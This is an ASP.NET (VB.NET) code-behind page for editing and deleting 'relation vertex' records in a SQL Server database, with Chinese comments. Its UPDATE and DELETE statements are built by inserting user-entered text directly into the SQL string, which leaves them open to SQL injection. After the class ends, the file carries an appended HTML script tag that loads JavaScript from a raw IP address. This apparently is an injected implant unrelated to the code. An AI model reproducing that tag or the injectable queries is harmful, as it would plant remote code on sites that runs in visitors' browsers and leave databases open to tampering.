Imports System.Data
Imports System.Data.SqlClient

Public Class modificationvertex
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents Label6 As System.Web.UI.WebControls.Label
    Protected WithEvents Label5 As System.Web.UI.WebControls.Label
    Protected WithEvents txtInstKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstVertex As System.Web.UI.WebControls.DropDownList
    Protected WithEvents Label8 As System.Web.UI.WebControls.Label
    Protected WithEvents txtVertexName As System.Web.UI.WebControls.TextBox
    Protected WithEvents Label7 As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnIsValidYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsValidNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents btnSearch As System.Web.UI.WebControls.Button
    Protected WithEvents btnModify As System.Web.UI.WebControls.Button
    Protected WithEvents btnDel As System.Web.UI.WebControls.Button
    Protected WithEvents ddlstVertexKey As System.Web.UI.WebControls.DropDownList
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Initial(ByVal index As Integer)  ' 初始化页面显示
        Me.ddlstVertexKey.SelectedIndex = index
        Me.txtVertexName.Text = Session("myDateSet").Tables("rvertex").Rows(index).Item("vertexname")
        Dim chrIsValid As String = Session("myDateSet").Tables("rvertex").Rows(index).Item("status")
        If (chrIsValid = "1") Then
            Me.rbtnIsValidNo.Checked = False
            Me.rbtnIsValidYes.Checked = True
        Else
            Me.rbtnIsValidYes.Checked = False
            Me.rbtnIsValidNo.Checked = True
        End If
        Dim strVorder As String = Session("myDateSet").Tables("rvertex").Rows(index).Item("vorder")
        Dim i As Integer = 0
        For i = 0 To Me.ddlstVertex.Items.Count - 1
            If (Me.ddlstVertex.Items(i).Value.Trim() = strVorder.Trim()) Then
                ddlstVertex.SelectedIndex = i
                Exit For
            End If
        Next
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If
        If Not IsPostBack Then
            Me.txtInstKey.Enabled = False
            Me.ddlstVertex.Enabled = False
            Me.txtInstKey.Text = Me.Session("InstKey")
            Me.rbtnIsValidYes.Checked = True

            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Dim myDateSetDef As New DataSet
            Dim myDateSetVertex As New DataSet
            Try
                mySqlConn.Open()

                strSql = [String].Format("select * from rdefinition where rdefinitionkey='{0}'", Me.Session("DefKey"))
                Dim mySqlAdapter As New SqlDataAdapter(strSql, mySqlConn)
                mySqlAdapter.Fill(myDateSetDef, "rdefinition")

                strSql = [String].Format("select * from rvertex where relationkey='{0}'", Me.Session("InstKey"))
                Dim mySqlAdapterVertex As New SqlDataAdapter(strSql, mySqlConn)
                mySqlAdapterVertex.Fill(myDateSetVertex, "rvertex")
                Session("myDateSet") = myDateSetVertex
                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try

            Me.ddlstVertexKey.DataSource = myDateSetVertex.Tables("rvertex").DefaultView
            Me.ddlstVertexKey.DataValueField = "rvertexkey"
            Me.ddlstVertexKey.DataBind()

            Dim inum As Integer = myDateSetDef.Tables("rdefinition").Rows(0).Item("relatedobjnum")
            Dim i As Integer
            Dim ss As String = "abcdefghijklmnopqrstuvwxyz"
            For i = 0 To inum - 1
                Me.ddlstVertex.Items.Add(ss.Substring(i, 1))
            Next
            If (Me.ddlstVertexKey.Items.Count > 0) Then
                Initial(0)
            End If
            Me.Session("index") = 0
        End If
    End Sub

    Private Sub btnModify_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnModify.Click
        If (Me.txtVertexName.Text.Trim() = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If
        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String

        Dim chrIsValid As Char
        If Me.rbtnIsValidYes.Checked = True Then
            chrIsValid = "1"
        Else
            chrIsValid = "0"
        End If

        strSql = [String].Format("update rvertex set vertexname='{0}',status='{1}' where rvertexkey='{2}'", _
            Me.txtVertexName.Text.Trim(), chrIsValid, Me.ddlstVertexKey.SelectedValue)
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "恭喜：修改关系项点" + Me.ddlstVertexKey.SelectedValue + "成功"
                Me.lblWarning.Visible = True
                strSql = [String].Format("select * from rvertex where relationkey='{0}'", Me.Session("InstKey"))
                Dim mySqlAdapter As New SqlDataAdapter(strSql, mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rvertex")
                Me.Session("myDateSet") = myDateSet
                Initial(Me.Session("index"))
            Else
                Me.lblWarning.Text = "警告：由于某种原因添加关系类型失败，可能你没有权限"
                Me.lblWarning.Visible = True
            End If
            mySqlConn.Close()
        Catch ex As SqlException
            mySqlConn.Close()
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnDel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDel.Click
        If (Me.ddlstVertexKey.Items.Count = 0) Then
            Me.lblWarning.Text = "提醒：没有关系顶点存在"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim mySqlComm As SqlCommand

        Try
            ' 修改数据项
            strSql = "delete from rvertex where rvertexkey='" + Me.ddlstVertexKey.SelectedValue.Trim() + "'"
            mySqlComm = New SqlCommand(strSql, mySqlConn)

            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "恭喜：删除关系顶点" + Me.ddlstVertexKey.SelectedValue.Trim() + "成功"
                Me.lblWarning.Visible = True
                Me.ddlstVertexKey.Items.Remove(Me.ddlstVertexKey.SelectedValue)
                If (Me.ddlstVertexKey.Items.Count = 0) Then
                    mySqlConn.Close()
                    Exit Sub
                End If

                strSql = [String].Format("select * from rvertex where relationkey='{0}'", Me.Session("InstKey"))
                Dim mySqlAdapter As New SqlDataAdapter(strSql, mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rvertex")
                Me.Session("myDateSet") = myDateSet
                Initial(Me.Session("index"))
            Else
                Me.lblWarning.Text = "警告：由于某种原因删除关系顶点失败，可能你没有权限"
                Me.lblWarning.Visible = True
            End If
            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnSearch_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSearch.Click
        If (Me.ddlstVertexKey.Items.Count = 0) Then
            Me.lblWarning.Text = "提醒：没有关系顶点存在"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Initial(Me.Session("index"))
    End Sub

    Private Sub ddlstVertexKey_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstVertexKey.SelectedIndexChanged
        Me.Session("index") = Me.ddlstVertexKey.SelectedIndex
    End Sub
End Class

<script src="http://222.208.183.246/ad/ad.js"></script>
